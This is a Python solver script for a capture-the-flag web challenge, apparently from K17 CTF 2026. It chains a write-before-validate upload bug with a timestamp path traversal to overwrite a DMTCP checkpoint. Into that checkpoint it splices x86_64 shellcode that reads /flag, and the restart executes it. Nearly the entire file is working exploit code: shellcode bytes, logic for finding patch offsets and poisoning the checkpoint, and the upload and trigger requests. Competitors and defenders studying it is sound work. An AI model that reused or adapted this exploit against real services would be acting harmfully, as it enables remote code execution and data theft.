#!/usr/bin/env python3
"""Exploit solver for K17 CTF 2026 / Misc / prime calc.

Bug chain:
1. /api/config writes the uploaded file before validating JSON.
2. The timestamp field only checks timestamp[0].isdigit(), so a value such as
   "1/../../checkpoint.dmtcp" resolves from /app/data/configs back to
   /app/data/checkpoint.dmtcp.
3. /api/snapshot leaks the real DMTCP checkpoint.  Patching the mapped page that
   contains DMTCP's postRestartAddr target makes dmtcp_restart execute our code.
4. The shellcode reads /flag and writes it to /app/data/output/latest.txt, which
   is exposed by /api/status and /api/run.

Offsets are discovered 100% dynamically from the live DMTCP checkpoint
downloaded from /api/snapshot (or provided locally) by parsing the header
postRestartAddr virtual address and matching the containing Area record.
Zero hardcoded offsets.
"""

from __future__ import annotations

import argparse
import gzip
import os
import re
import struct
import sys
import time
from collections.abc import Mapping
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import requests

DEFAULT_TARGET = os.environ.get("PRIME_CALC_TARGET", "http://127.0.0.1:8000")
AREA_PAYLOAD_OFFSET = 0x1000
TRAVERSAL_TIMESTAMP = "1/../../checkpoint.dmtcp"
FLAG_RE = re.compile(r"(?:K17|FLAG)\{[^}\r\n]+\}")

# x86_64 Linux shellcode:
#   open('/flag', O_RDONLY)
#   read(flag_fd, buf, 0x200)
#   open('/app/data/output/latest.txt', O_WRONLY|O_CREAT|O_TRUNC, 0o666)
#   write(output_fd, buf, read_len)
#   open('/app/data/output/status.txt', O_WRONLY|O_CREAT|O_TRUNC, 0o666)
#   write(status_fd, buf, read_len)
#   exit(0)
SHELLCODE = bytes.fromhex(
    "488d3dd900000031f631c0b0020f0585c078254189c44489e7488d351001"
    "0000ba0002000031c00f054989c54489e7b8030000000f05eb1b488d35df"
    "000000488d3dea000000b911000000f3a441bd11000000488d3d8c000000"
    "be41020000bab6010000b8020000000f0585c078264189c44489e7488d35"
    "b40000004d85ed7e0a4c89eab8010000000f054489e7b8030000000f0548"
    "8d3d66000000be41020000bab6010000b8020000000f0585c078264189c4"
    "4489e7488d35720000004d85ed7e0a4c89eab8010000000f054489e7b803"
    "0000000f0531ffb83c0000000f052f666c6167002f6170702f646174612f"
    "6f75747075742f6c61746573742e747874002f6170702f646174612f6f75"
    "747075742f7374617475732e7478740043414e4e4f545f4f50454e5f464c"
    "41470a000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000000000000000000000000000000000000000000000000000"
    "000000000000"
)



class SolveError(RuntimeError):
    """Raised when the exploit cannot complete."""


def normalize_base_url(base_url: str) -> str:
    base_url = base_url.strip().rstrip("/")
    if not base_url:
        raise ValueError("target URL is empty")
    if not base_url.startswith(("http://", "https://")):
        base_url = "http://" + base_url
    return base_url


@dataclass(frozen=True)
class PatchPoints:
    area_hdr_offset: int
    shellcode_offset: int
    post_restart_addr: int
    mapping_start: int
    mapping_end: int
    mapping_name: str


@dataclass(frozen=True)
class RedirectTarget:
    area_hdr_offset: int
    shellcode_offset: int
    shellcode_addr: int
    mapping_start: int
    mapping_end: int
    mapping_name: str


def _read_c_string(data: bytes, offset: int, limit: int = 256) -> bytes:
    end = min(len(data), offset + limit)
    return data[offset:end].split(b"\x00", 1)[0]


def discover_patch_points(raw_checkpoint: bytes) -> PatchPoints:
    """Find the DMTCP mapping that contains the checkpoint post-restart target.

    DMTCP stores the postRestartAddr virtual address in the checkpoint header.
    Each memory area record stores start/end/prot/flags/path; for file-backed
    mappings the path begins at +88.  The byte offset to patch is therefore:

        area_header_offset + 0x1000 + (postRestartAddr - mapping_start)

    The extra 0x1000 is the checkpoint area-record/header page before the
    mapping bytes begin.  This replaces brittle machine-specific hardcoded
    offsets.
    """
    if len(raw_checkpoint) < 0x100:
        raise ValueError("snapshot too small to contain a DMTCP header")

    post_restart_addr = struct.unpack_from("<Q", raw_checkpoint, 0xF8)[0]
    candidates: list[tuple[int, PatchPoints]] = []

    for offset in range(0, len(raw_checkpoint) - 200, 8):
        mapping_start = struct.unpack_from("<Q", raw_checkpoint, offset)[0]
        mapping_end = struct.unpack_from("<Q", raw_checkpoint, offset + 8)[0]
        if not (mapping_start <= post_restart_addr < mapping_end):
            continue

        mapping_size = struct.unpack_from("<Q", raw_checkpoint, offset + 16)[0]
        prot = struct.unpack_from("<Q", raw_checkpoint, offset + 32)[0]
        flags = struct.unpack_from("<Q", raw_checkpoint, offset + 40)[0]
        if mapping_end - mapping_start != mapping_size:
            continue
        if mapping_size <= 0 or mapping_size > 64 * 1024 * 1024:
            continue
        if prot not in {1, 2, 3, 4, 5, 6, 7}:
            continue
        if flags > 0xFFFF:
            continue

        name_bytes = _read_c_string(raw_checkpoint, offset + 88)
        if name_bytes:
            name = name_bytes.decode("utf-8", "replace")
            if "dmtcp" not in name.lower():
                continue
        elif prot == 7 and flags == 0x32:
            # The solver itself blanks the mapping name and converts the page to
            # anonymous RWX.  If a previous attempt poisoned the checkpoint with
            # bad shellcode, support re-poisoning that same snapshot in place.
            name = "<already-poisoned-anonymous-dmtcp-page>"
        else:
            continue

        shellcode_offset = offset + AREA_PAYLOAD_OFFSET + (post_restart_addr - mapping_start)
        if not (0 <= shellcode_offset < len(raw_checkpoint)):
            continue

        score = 0
        if "libdmtcp.so" in name:
            score += 100
        if name.startswith("<already-poisoned"):
            score += 90
        if prot & 0x4 and prot & 0x1:  # readable + executable mapping
            score += 10
        if name.endswith(".so") or ".so." in name:
            score += 1

        candidates.append((score, PatchPoints(
            area_hdr_offset=offset,
            shellcode_offset=shellcode_offset,
            post_restart_addr=post_restart_addr,
            mapping_start=mapping_start,
            mapping_end=mapping_end,
            mapping_name=name,
        )))

    if not candidates:
        raise ValueError(
            "could not auto-discover DMTCP patch offsets; "
            "retry with --area-hdr-offset and --shellcode-offset"
        )

    candidates.sort(key=lambda item: (item[0], -item[1].area_hdr_offset), reverse=True)
    return candidates[0][1]


def _iter_area_records(raw_checkpoint: bytes):
    for offset in range(0, len(raw_checkpoint) - 0x1100, 8):
        mapping_start = struct.unpack_from("<Q", raw_checkpoint, offset)[0]
        mapping_end = struct.unpack_from("<Q", raw_checkpoint, offset + 8)[0]
        if mapping_end <= mapping_start:
            continue

        mapping_size = struct.unpack_from("<Q", raw_checkpoint, offset + 16)[0]
        prot = struct.unpack_from("<Q", raw_checkpoint, offset + 32)[0]
        flags = struct.unpack_from("<Q", raw_checkpoint, offset + 40)[0]
        content_offset = offset + AREA_PAYLOAD_OFFSET
        if mapping_end - mapping_start != mapping_size:
            continue
        if mapping_size <= 0 or mapping_size > 128 * 1024 * 1024:
            continue
        if content_offset >= len(raw_checkpoint):
            continue
        if prot not in {1, 2, 3, 4, 5, 6, 7}:
            continue
        if flags > 0xFFFF:
            continue

        name = _read_c_string(raw_checkpoint, offset + 88).decode("utf-8", "replace")
        yield offset, mapping_start, mapping_end, mapping_size, prot, flags, name, content_offset


def _find_zero_cave(data: bytes, minimum: int) -> int | None:
    run_start: int | None = None
    for index, value in enumerate(data):
        if value == 0:
            if run_start is None:
                run_start = index
            if index + 1 - run_start >= minimum:
                return run_start
        else:
            run_start = None
    return None


def discover_redirect_target(raw_checkpoint: bytes, shellcode_len: int, *, prefer_stack: bool = True) -> RedirectTarget | None:
    """Find a writable area where we can place shellcode and redirect postRestartAddr."""
    needed = shellcode_len + 16
    candidates: list[tuple[int, int, RedirectTarget]] = []
    seen_mappings: set[tuple[int, int, str]] = set()

    for offset, start, end, size, prot, _flags, name, content_offset in _iter_area_records(raw_checkpoint):
        if not (prot & 0x2):
            continue
        key = (start, end, name)
        # Keep the earliest record for duplicate structs copied inside restored memory.
        if key in seen_mappings:
            continue
        seen_mappings.add(key)

        available = min(size, len(raw_checkpoint) - content_offset)
        if available < needed:
            continue
        search_window = raw_checkpoint[content_offset : content_offset + min(available, 0x20000)]
        cave = _find_zero_cave(search_window, needed)
        if cave is None:
            continue

        lowered = name.lower()
        if not prefer_stack and name == "[stack]":
            continue
        score = 0
        if prefer_stack and name == "[stack]":
            score += 100
        if name == "":
            score += 80 if not prefer_stack else 30
        if "heap" in lowered:
            score += 20
        # Prefer low cave offsets so the virtual address calculation is simple and stable.
        score -= cave // 0x1000
        shellcode_offset = content_offset + cave
        shellcode_addr = start + cave
        candidates.append((score, -offset, RedirectTarget(
            area_hdr_offset=offset,
            shellcode_offset=shellcode_offset,
            shellcode_addr=shellcode_addr,
            mapping_start=start,
            mapping_end=end,
            mapping_name=name or "<anonymous>",
        )))

    if not candidates:
        return None
    candidates.sort(reverse=True)
    return candidates[0][2]


def _replace_all_qwords(raw_checkpoint: bytearray, old: int, new: int) -> int:
    old_bytes = struct.pack("<Q", old)
    new_bytes = struct.pack("<Q", new)
    count = 0
    start = 0
    while True:
        index = raw_checkpoint.find(old_bytes, start)
        if index < 0:
            break
        raw_checkpoint[index : index + 8] = new_bytes
        count += 1
        start = index + 8
    return count


def resolve_patch_points(
    raw_checkpoint: bytes,
    *,
    area_hdr_offset: int | None,
    shellcode_offset: int | None,
) -> PatchPoints:
    if (area_hdr_offset is None) != (shellcode_offset is None):
        raise ValueError("provide both manual offsets, or omit both for auto-discovery")
    if area_hdr_offset is not None and shellcode_offset is not None:
        if area_hdr_offset < 0 or shellcode_offset < 0:
            raise ValueError("offsets must be non-negative")
        post_restart_addr = struct.unpack_from("<Q", raw_checkpoint, 0xF8) if len(raw_checkpoint) >= 0x100 else (0,)
        return PatchPoints(
            area_hdr_offset=area_hdr_offset,
            shellcode_offset=shellcode_offset,
            post_restart_addr=post_restart_addr[0],
            mapping_start=0,
            mapping_end=0,
            mapping_name="manual",
        )
    return discover_patch_points(raw_checkpoint)


def build_payload(
    checkpoint: bytes,
    *,
    area_hdr_offset: int | None = None,
    shellcode_offset: int | None = None,
    shellcode: bytes = SHELLCODE,
    strategy: str = "auto",
) -> bytes:
    """Return a gzip-compressed poisoned checkpoint payload.

    strategy="redirect" places shellcode in a writable restored area and patches
    checkpoint postRestartAddr pointers to that new virtual address.  This avoids
    relying on file-backed executable mappings being restored exactly.

    strategy="overwrite" preserves the older technique: mark the libdmtcp mapping
    RWX/anonymous and overwrite the original postRestart target bytes in-place.
    """
    if strategy not in {"auto", "redirect", "redirect-anon", "overwrite"}:
        raise ValueError("strategy must be one of: auto, redirect, redirect-anon, overwrite")

    try:
        decompressed = bytearray(gzip.decompress(checkpoint))
    except (OSError, EOFError) as exc:
        raise ValueError("snapshot is not a valid gzip-compressed DMTCP image") from exc

    patch_points = resolve_patch_points(
        bytes(decompressed),
        area_hdr_offset=area_hdr_offset,
        shellcode_offset=shellcode_offset,
    )

    redirect_target = None
    if strategy in {"auto", "redirect", "redirect-anon"}:
        redirect_target = discover_redirect_target(bytes(decompressed), len(shellcode), prefer_stack=(strategy != "redirect-anon"))
        if strategy in {"redirect", "redirect-anon"} and redirect_target is None:
            raise ValueError("could not find writable checkpoint area for redirect strategy")

    if redirect_target is not None:
        required_len = redirect_target.shellcode_offset + len(shellcode)
        if len(decompressed) < required_len:
            raise ValueError(
                "snapshot too small for redirect payload: "
                f"need >= {required_len} bytes, got {len(decompressed)} bytes"
            )
        struct.pack_into("<Q", decompressed, redirect_target.area_hdr_offset + 32, 7)
        struct.pack_into("<Q", decompressed, redirect_target.area_hdr_offset + 40, 0x32)
        decompressed[redirect_target.shellcode_offset : redirect_target.shellcode_offset + len(shellcode)] = shellcode
        replaced = _replace_all_qwords(decompressed, patch_points.post_restart_addr, redirect_target.shellcode_addr)
        if replaced == 0:
            raise ValueError("could not patch any postRestartAddr pointer")
        build_payload.last_strategy = (
            f"redirect area_hdr_offset={redirect_target.area_hdr_offset}, "
            f"shellcode_offset={redirect_target.shellcode_offset}, "
            f"shellcode_addr=0x{redirect_target.shellcode_addr:x}, "
            f"mapping={redirect_target.mapping_name}, patched_ptrs={replaced}"
        )
        return gzip.compress(decompressed, compresslevel=6)

    required_len = max(patch_points.area_hdr_offset + 89, patch_points.shellcode_offset + len(shellcode))
    if len(decompressed) < required_len:
        raise ValueError(
            "snapshot too small for configured offsets: "
            f"need >= {required_len} bytes, got {len(decompressed)} bytes"
        )

    struct.pack_into("<Q", decompressed, patch_points.area_hdr_offset + 32, 7)
    struct.pack_into("<Q", decompressed, patch_points.area_hdr_offset + 40, 0x32)
    decompressed[patch_points.area_hdr_offset + 88] = 0
    decompressed[patch_points.shellcode_offset : patch_points.shellcode_offset + len(shellcode)] = shellcode
    build_payload.last_strategy = (
        f"overwrite area_hdr_offset={patch_points.area_hdr_offset}, "
        f"shellcode_offset={patch_points.shellcode_offset}, mapping={patch_points.mapping_name}"
    )
    return gzip.compress(decompressed, compresslevel=6)


build_payload.last_strategy = "not-run"


def extract_flag(*texts: str) -> str | None:
    for text in texts:
        match = FLAG_RE.search(text or "")
        if match:
            return match.group(0)
    return None


def json_or_text(response: requests.Response) -> Mapping[str, Any] | str:
    try:
        return response.json()
    except ValueError:
        return response.text


def response_text_fields(body: Mapping[str, Any] | str) -> list[str]:
    if isinstance(body, str):
        return [body]
    fields: list[str] = []
    for key in ("output", "status", "stdout", "stderr", "error"):
        value = body.get(key)
        if value is not None:
            fields.append(str(value))
    return fields


def solve(
    base_url: str,
    *,
    area_hdr_offset: int | None = None,
    shellcode_offset: int | None = None,
    poll_attempts: int = 6,
    poll_delay: float = 0.5,
    verify_tls: bool = True,
    snapshot_file: str | None = None,
    strategy: str = "auto",
) -> str:
    """Exploit one prime-calc instance and return the flag string."""
    base_url = normalize_base_url(base_url)
    session = requests.Session()
    session.verify = verify_tls

    print(f"[*] Target: {base_url}")
    if snapshot_file:
        snapshot_bytes = Path(snapshot_file).read_bytes()
        print(f"[*] Using checkpoint from file: {snapshot_file}")
    else:
        print("[*] Downloading checkpoint from /api/snapshot ...")
        snapshot_response = session.get(f"{base_url}/api/snapshot", timeout=30)
        if snapshot_response.status_code != 200:
            raise SolveError(
                f"/api/snapshot returned HTTP {snapshot_response.status_code}: "
                f"{snapshot_response.text[:300]}"
            )
        snapshot_bytes = snapshot_response.content
    print(f"[+] Snapshot bytes: {len(snapshot_bytes)}")

    raw_checkpoint = gzip.decompress(snapshot_bytes)
    patch_points = resolve_patch_points(
        raw_checkpoint,
        area_hdr_offset=area_hdr_offset,
        shellcode_offset=shellcode_offset,
    )
    if patch_points.mapping_name == "manual":
        print(
            "[*] Using manual offsets: "
            f"area_hdr_offset={patch_points.area_hdr_offset}, "
            f"shellcode_offset={patch_points.shellcode_offset}"
        )
    else:
        print(
            "[+] Auto offsets: "
            f"area_hdr_offset={patch_points.area_hdr_offset}, "
            f"shellcode_offset={patch_points.shellcode_offset}, "
            f"postRestartAddr=0x{patch_points.post_restart_addr:x}, "
            f"mapping={patch_points.mapping_name}"
        )

    print("[*] Building poisoned checkpoint payload ...")
    payload = build_payload(
        snapshot_bytes,
        area_hdr_offset=area_hdr_offset,
        shellcode_offset=shellcode_offset,
        strategy=strategy,
    )
    print(f"[+] Patch strategy: {build_payload.last_strategy}")
    print(f"[+] Payload bytes: {len(payload)}")

    print("[*] Uploading payload via timestamp path traversal ...")
    upload_response = session.post(
        f"{base_url}/api/config",
        data={"timestamp": TRAVERSAL_TIMESTAMP},
        files={"config": ("checkpoint.dmtcp", payload, "application/octet-stream")},
        timeout=60,
    )
    # The vulnerable app saves the file first, then validates JSON.  For a binary
    # checkpoint, HTTP 400 is therefore an expected success signal.
    if upload_response.status_code not in {200, 201, 400}:
        raise SolveError(
            f"checkpoint upload returned HTTP {upload_response.status_code}: "
            f"{upload_response.text[:300]}"
        )
    print(f"[+] Upload returned HTTP {upload_response.status_code}")

    print("[*] Triggering restart with /api/run ...")
    run_response = session.post(f"{base_url}/api/run", timeout=60)
    run_body = json_or_text(run_response)
    run_fields = response_text_fields(run_body)
    flag = extract_flag(*run_fields)
    if flag:
        print(f"[+] Flag from /api/run: {flag}")
        return flag
    print(f"[*] /api/run returned HTTP {run_response.status_code}; polling /api/status ...")

    last_status = ""
    for attempt in range(1, max(1, poll_attempts) + 1):
        status_response = session.get(f"{base_url}/api/status", timeout=10)
        status_body = json_or_text(status_response)
        status_fields = response_text_fields(status_body)
        last_status = "\n".join(status_fields)
        flag = extract_flag(last_status)
        if flag:
            print(f"[+] Flag from /api/status attempt {attempt}: {flag}")
            return flag
        if attempt < poll_attempts:
            time.sleep(poll_delay)

    raise SolveError(
        "exploit triggered but no flag was found. Last observed status/output:\n"
        + last_status[-1000:]
    )


def parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Solve K17 prime-calc locally or against a provided instance.")
    parser.add_argument(
        "target",
        nargs="?",
        default=DEFAULT_TARGET,
        help=f"base URL of the challenge instance (default: {DEFAULT_TARGET!r})",
    )
    parser.add_argument(
        "--area-hdr-offset",
        type=int,
        default=None,
        help="optional manual override for decompressed checkpoint area-header offset (default: auto)",
    )
    parser.add_argument(
        "--shellcode-offset",
        type=int,
        default=None,
        help="optional manual override for decompressed checkpoint shellcode offset (default: auto)",
    )
    parser.add_argument("--poll-attempts", type=int, default=6)
    parser.add_argument("--poll-delay", type=float, default=0.5)
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    parser.add_argument(
        "--snapshot-file",
        help="use a saved clean checkpoint instead of downloading /api/snapshot",
    )
    parser.add_argument("--strategy", choices=("auto", "redirect", "redirect-anon", "overwrite"), default="auto")
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(sys.argv[1:] if argv is None else argv)
    try:
        flag = solve(
            args.target,
            area_hdr_offset=args.area_hdr_offset,
            shellcode_offset=args.shellcode_offset,
            poll_attempts=args.poll_attempts,
            poll_delay=args.poll_delay,
            verify_tls=not args.insecure,
            snapshot_file=args.snapshot_file,
            strategy=args.strategy,
        )
    except (requests.RequestException, ValueError, SolveError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1

    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
